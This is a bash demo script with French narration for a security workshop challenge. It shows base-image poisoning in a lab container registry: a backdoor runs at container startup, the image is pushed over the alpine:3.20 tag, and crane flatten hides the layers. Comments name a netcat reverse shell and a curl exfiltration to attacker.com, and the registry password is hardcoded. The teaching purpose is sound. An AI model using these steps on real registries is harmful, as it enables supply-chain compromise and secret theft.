#!/bin/bash

########################
# include the magic
########################
. ../../bin/demo-magic.sh

clear

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../../setup/scripts/domains.sh"
REGISTRY_URL="https://${REGISTRY_HOST}"
REGISTRY_USER="sc-admin"
REGISTRY_PASS="RegistryPass123!"
CA_CERT="${SCRIPT_DIR}/../../setup/certs/registry.crt"
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
export SSL_CERT_FILE=${REPO_ROOT}/setup/certs/registry.crt
WORK_DIR=$(mktemp -d)
cleanup() {
    rm -rf "${WORK_DIR}"
}
trap cleanup EXIT

# ============================================================================
# Introduction
# ============================================================================

p "=== DEMO ATTAQUE : Challenge 3 — Empoisonnement d'image de base ==="


pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"
# ============================================================================
# Étape 1.1 — Création du script backdoor
# ============================================================================

p "1. Création du script backdoor"

cat > "${WORK_DIR}/backdoor.sh" << 'EOF'
#!/bin/sh
# Malicious payload - Reverse shell backdoor
# In a real attack, this could exfiltrate secrets, create persistence, etc.

# Simulate data exfiltration 
echo "[MALWARE] Backdoor activated in production container!"
echo "[MALWARE] Flag: $FLAG"
echo "[MALWARE] Hostname: $(hostname)"

# In a real attack, this would:
# - Establish reverse shell: nc attacker.com 4444 -e /bin/sh
# - Exfiltrate secrets: curl -X POST -d "$(env)" attacker.com/exfil
# - Install cryptocurrency miner
EOF
chmod +x "${WORK_DIR}/backdoor.sh"

pe "bat ${WORK_DIR}/backdoor.sh"

# ============================================================================
# Étape 1.2 — Création du Dockerfile malveillant
# ============================================================================

p "2. Création du Dockerfile malveillant"

cat > "${WORK_DIR}/Dockerfile" << 'EOF'
# Start from legitimate Alpine image
FROM alpine:3.20

# Install our backdoor payload
COPY backdoor.sh /usr/local/bin/backdoor.sh
RUN chmod +x /usr/local/bin/backdoor.sh

# Execute backdoor on container startup (stealthy - runs in background)
# This modifies the shell profile so any container using this image
# will execute our malware when starting
RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
    echo '/usr/local/bin/backdoor.sh &' >> /etc/profile.d/init.sh && \
    chmod +x /etc/profile.d/init.sh

# Make the backdoor part of the default entrypoint behavior
# When the container starts, our malware runs first
ENTRYPOINT ["/bin/sh", "-c", "/etc/profile.d/init.sh && exec \"$@\"", "--"]
EOF

pe "bat ${WORK_DIR}/Dockerfile"



# ============================================================================
# Étape 1.3 — Build de l'image empoisonnée
# ============================================================================

p "3. Build de l'image empoisonnée"
pe "podman build -t ${REGISTRY_HOST}/alpine:3.20 ${WORK_DIR}"



# ============================================================================
# Étape 2 — Push vers le registre + crane flatten
# ============================================================================

p "4. Push de l'image empoisonnée vers le registre"
pei "podman login ${REGISTRY_HOST} -u ${REGISTRY_USER} -p ${REGISTRY_PASS} 2>/dev/null"
pe "podman push ${REGISTRY_HOST}/alpine:3.20"

p "→ L'image a été pushée. Regardons son manifest — on voit plusieurs couches :"
pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"

p "→ Avec crane flatten, on fusionne toutes les couches en une seule :"

pe "crane flatten ${REGISTRY_HOST}/alpine:3.20 -t ${REGISTRY_HOST}/alpine:3.20"

p "→ Après le flatten, il n'y a plus qu'une seule couche :"
pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"

p "→ Le backdoor est maintenant invisible dans l'historique des couches."



# ============================================================================
# Vérification
# ============================================================================

p "5. Vérification que l'image est bien dans le registre"
pe "dive podman://${REGISTRY_HOST}/alpine:3.20"

p "→ Le registre contient l'image alpine:3.20 empoisonnée et aplatie."
p "→ Toute pipeline qui fait FROM alpine:3.20 embarquera notre malware."

p "✅"
